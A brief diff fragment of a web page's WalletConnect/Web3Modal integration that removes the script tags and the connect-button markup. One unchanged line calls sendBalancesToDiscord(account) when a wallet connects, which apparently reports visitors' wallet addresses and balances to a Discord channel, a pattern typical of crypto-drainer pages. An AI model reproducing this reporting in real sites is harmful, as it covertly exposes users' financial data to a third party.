@@ -1,4 +1,3 @@
-<script type="module">
   import {
     EthereumClient,
     w3mConnectors,
@@ -87,7 +86,3 @@
       sendBalancesToDiscord(account);
     }
   });
-</script>
-
-<!-- Only wallet connect button in HTML -->
-<w3m-core-button></w3m-core-button>
